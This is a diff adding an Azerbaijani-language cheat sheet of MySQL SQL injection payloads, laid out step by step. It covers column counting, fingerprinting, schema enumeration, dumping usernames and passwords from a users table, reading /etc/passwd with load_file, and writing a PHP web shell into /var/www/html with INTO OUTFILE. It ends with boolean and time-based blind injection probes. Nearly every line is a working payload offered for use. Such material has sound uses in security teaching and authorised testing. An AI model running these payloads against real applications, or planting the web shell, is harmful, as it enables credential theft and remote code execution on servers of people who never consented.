@@ -1,0 +1,71 @@
+MySQL SQL Injection
+Bu sənəddə MySQL verilənlər bazası üzərində qurulmuş zəif tətbiqlərdə SQL Injection boşluğunu mərhələli şəkildə istismar etmək üçün istifadə olunan payloadlar ardıcıllıqla göstərilmişdir.
+Addım 1: Sütun Sayının Təyin Edilməsi (Column Count)
+UNION-based injection etmək üçün orijinal sorğunun neçə sütun qaytardığını mütləq bilməliyik. Əgər sütun sayı uyğun gəlməsə, MySQL xəta verəcək.
+Sütun sayını tapmaq üçün iki metod mövcuddur:
+Metod A: ORDER BY ilə (Tövsiyə olunan)
+Xəta alana qədər rəqəmi artırırıq. Əgər 5 yazdıqda xəta verirsə, deməli cədvəldə 4 sütun var.
+' ORDER BY 1 -- 
+' ORDER BY 2 -- 
+' ORDER BY 3 -- 
+' ORDER BY 4 -- 
+
+(Qeyd: -- işarəsindən sonra mütləq bir boşluq buraxılmalıdır).
+Metod B: UNION SELECT ilə
+Rəqəmlərin sayını artıraraq xətanın itməsini gözləyirik:
+' UNION SELECT 1 -- 
+' UNION SELECT 1,2 -- 
+' UNION SELECT 1,2,3 -- 
+' UNION SELECT 1,2,3,4 -- 
+
+Addım 2: Verilənlər Bazası Haqqında Məlumat Toplama (Fingerprinting)
+Tutaq ki, yoxlamalar nəticəsində cədvəlin 4 sütundan ibarət olduğunu təyin etdik. İndi hansı sütunların ekranda göründüyünü yoxlamaq və baza haqqında kritik məlumatları çəkmək lazımdır.
+Sistem istifadəçisini və verilənlər bazasının adını öyrənmək:
+' UNION SELECT 1, user(), database(), 4 -- 
+
+MySQL versiyasını öyrənmək:
+' UNION SELECT 1, @@version, version(), 4 -- 
+
+Bazanın yerləşdiyi qovluğu və əməliyyat sistemini öyrənmək:
+' UNION SELECT 1, @@basedir, @@datadir, 4 -- 
+
+Addım 3: Cədvəl Adlarının Çıxarılması (Table Enumeration)
+MySQL-də bütün verilənlər bazalarının, cədvəllərin və sütunların strukturu information_schema adlı xüsusi bir sistem bazasında saxlanılır.
+Cari verilənlər bazasındakı (database()) bütün cədvəllərin siyahısını çıxarmaq üçün:
+' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- 
+
+Əgər bütün bazalardakı cədvəlləri görmək istəyirsinizsə:
+' UNION SELECT 1, table_name, table_schema, 4 FROM information_schema.tables -- 
+
+Addım 4: Sütun Adlarının Çıxarılması (Column Enumeration)
+Tutaq ki, yuxarıdakı addımda hədəf cədvəlimizin adının users olduğunu tapdıq. İndi həmin cədvəlin hansı sütunlardan (məsələn: id, username, password) ibarət olduğunu öyrənməliyik:
+' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() -- 
+
+Addım 5: Məlumatların Çıxarılması (Data Extraction)
+Cədvəl adını (users) və sütun adlarını (username, password) bildikdən sonra, bazadakı bütün məlumatları birbaşa ekrana tökə bilərik:
+' UNION SELECT 1, username, password, 4 FROM users -- 
+
+Çoxlu Sətirləri Birləşdirmək (group_concat)
+Əgər tətbiqin dizaynı yalnız tək bir sətir göstərməyə icazə verirsə, bütün istifadəçi adlarını və şifrləri tək bir sətirdə birləşdirərək oxumaq olar:
+' UNION SELECT 1, group_concat(username, ':', password), 3, 4 FROM users -- 
+
+(Bu sorğu ekrana admin:pbkdf2_sha256..., user1:pass123 şəklində nəticə çıxaracaq).
+Addım 6: Qabaqcıl MySQL Texnikaları (Advanced Exploitation)
+A. Sistemdən Fayl Oxumaq (LOAD_FILE)
+Əgər verilənlər bazası istifadəçisinin lazımi üstünlükləri (privileges) varsa, o, serverdəki lokal faylları oxuya bilər:
+' UNION SELECT 1, load_file('/etc/passwd'), 3, 4 -- 
+
+B. Serverə Fayl Yazmaq (INTO OUTFILE - Webshell yükləmək)
+Əgər serverin /var/www/html/ (və ya digər web qovluğu) qovluğuna yazmaq icazəsi varsa, birbaşa server daxilində yeni bir PHP/Python faylı yaradaraq uzaqdan idarəetmə (RCE) əldə etmək olar:
+' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php' -- 
+
+Addım 7: Kor MySQL İnyeksiyası (Blind SQLi)
+Əgər tətbiq ekrana heç bir məlumat çıxarmırsa, lakin biz SQL-in işlədiyini biliriksə:
+Boolean-based (Məntiqi yoxlama):
+' AND ascii(substring(version(),1,1))=53 -- 
+
+(MySQL versiyasının ilk simvolunun ASCII kodu 53-ə, yəni '5' rəqəminə bərabər olub-olmadığını yoxlayır).
+Time-based (Zaman əsaslı yoxlama):
+Əgər şərt doğrudursa, səhifənin cavab verməsini 5 saniyə gecikdirir:
+' AND IF(version() LIKE '8%', sleep(5), 0) -- 
+
